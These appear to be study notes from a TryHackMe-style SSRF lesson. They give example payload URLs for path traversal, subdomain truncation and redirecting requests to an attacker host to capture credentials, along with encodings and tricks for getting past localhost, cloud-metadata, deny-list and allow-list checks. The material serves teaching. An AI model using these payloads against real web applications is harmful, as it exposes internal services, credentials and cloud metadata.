# Server Side Request Forgery (SSRF) 
* Vulnerability that allows a malicious user to cause a web server to make an additional or edited HTTP request to the resource of the attacker's choosing.
## Types of SSRF
* There are two types of SSRF vulnerability:
  * Regular SSRF where data is returned to the attacker's screen.
  * Blind SSRF is where an SSRF occurs but no information is returned to the attacker's screen.
## What's the impact?
* A successful SSRF attack can result in:
  * Access to unauthorised areas.
  * Access to customer/organisational data.
  * Ability to Scale to internal networks.
  * Reveal authentication tokens/credentials.
## SSRF Examples
### Example 1 - Complete Control of Request
1. Expected request `http://website.thm/stock?url=http://api/stock/item?id=123`.
1. Attacker requests `http://website.thm/stock?url=http://api.website.thm/api/user`.
2. Website requests `http://api.website.thm/api/user`.
3. API server (api.website.thm) returns user data to the website instead of stock information.
4. Website (website.thm) returns user data to attacker.
### Example 2 - Directory Traversal
* The attacker can still reach the `/api/user` page with only having control over the path by utilising directory traversal.
1. Expected request `http://website.thm/stock?url=/item?id=123`.
1. Attacker requests `http://website.thm/stock?url=/../user`.
   * When `website.thm` receives `../` this is a message to move up a directory.
   * This removes the `/stock` portion of the request.
   * Turns the final request into `/api/user`.
3. Website requests `http://api.website.thm/api/stock/../user`.
4. API server (api.website.thm) returns user data to the website instead of stock information.
5. Website (website.thm) returns user data to attacker.
### Example 3 - Subdomain Control
* When the attacker can control the server's subdomain to which the request is made. 
1. Expected request `http://website.thm/stock?server=api&id=123`.
1. Attacker requests `http://website.thm/stock?server=api.website.thm/api/user&x=&id=123`.
   * Take note of the payload ending in `&x=` being used to stop the remaining path from being appended to the end of the attacker's URL.
   * This instead turns it into a parameter on the query string.
3. Website requests `http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123`.
4. API server (api.website.thm) returns user data to the website instead of stock information.
5. Website (website.thm) returns user data to attacker.
### Example 4 - Request a Server of the Attacker's Choice
1. Expected request `http://website.thm/stock?url=http://api/stock/item?id=123`.
1. Attacker requests `http://website.thm/stock?url=[http://api.website.thm/api/use](http://hacker-domain.thm/)r`.
2. Website requests data from `hacker-domain.thm` instead of `api.website.thm`.
   * Can capture request headers that are sent to the attacker's specified domain.
   * These headers could contain authentication credentials or API keys sent by `website.thm` that would normally authenticate to `api.website.thm`.
### Example 5 - Challenge
1. Expected request `https://website.thm/item/2?server=api`
   * URL that `website.thm` is requesting: `https://api.website.thm/api/item?id=2`
3. Change the address to force the web server to return data from `https://server.website.thm/flag?id=9`.
4. Attacker requests `https://website.thm/item/2?server=server.website.thm/flag?id=9&x=`
   * URL that `website.thm` is requesting: `https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2`.

## Finding an SSRF
* Potential SSRF vulnerabilities can be spotted in web applications in many different ways:
  * When a full URL is used in a parameter in the address bar:
    * `https://website.thm/form?server=http://server.website.thm/store`
  * A hidden field in a form:
    * `<input type="hidden" name="server" value="http://server.website.thm/store"?`
  * A partial URL such as just the hostname (`api`):
    * `https://website.thm/form?server=api`
  * Only the path of the URL (`forms/contact`):
    * `https://website.thm/form?dst=/forms/contact`
* Some of the examples are easier to exploit than others.
  * A lot of trial and error will be required to find a working payload.
* An external HTTP logging tool will need to be used to monitor requests if working with a blind SSRF where no output is reflected back:
  * `requestbin.com`.
  * Own HTTP server.
  * Burp Suite's Collaborator client.

## Defeating Common SSRF Defences
* More security savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. 
### Deny List
* All requests are accepted apart from resources specified in a list or matching a particular pattern.
* A Web Application may employ a deny list to protect assets from being accessed by the public while still allowing access to other location:
  * Sensitive endpoints.
  * IP addresses.
  * Domains s.
* A specific endpoint to restrict access is the localhost.
  * This may contain server performance data or further sensitive information.
  * `localhost` and `127.0.0.1` should appear on a deny list.
* Attackers can bypass a Deny List by using alternative localhost references such as:
  * `0`
  * `0.0.0.0`
  * `0000`
  * `127.1`
  * `127.*.*.*`
  * `2130706433`
  * `017700000001`
* A deny list can also be bypassed using subdomains that have a DNS record which resolves to the IP Address `127.0.0.1` such as `127.0.0.1.nip.io`.
* In a cloud environment, it is beneficial to block access to the IP address `169.254.169.254`, which contains metadata for the deployed cloud server, including possibly sensitive information.
  * An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address `169.254.169.254`.
### Allow List
* Where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with `https://website.thm`.
  * An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as `https://website.thm.attackers-domain.thm`.
  * The application logic would now allow this input and let an attacker control the internal HTTP request.
### Open Redirect
* If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect.
* An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address.
  * E.g. the link `https://website.thm/link?url=https://tryhackme.com`.
  * This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes.
  * Imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with `https://website.thm/`.
    * An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.
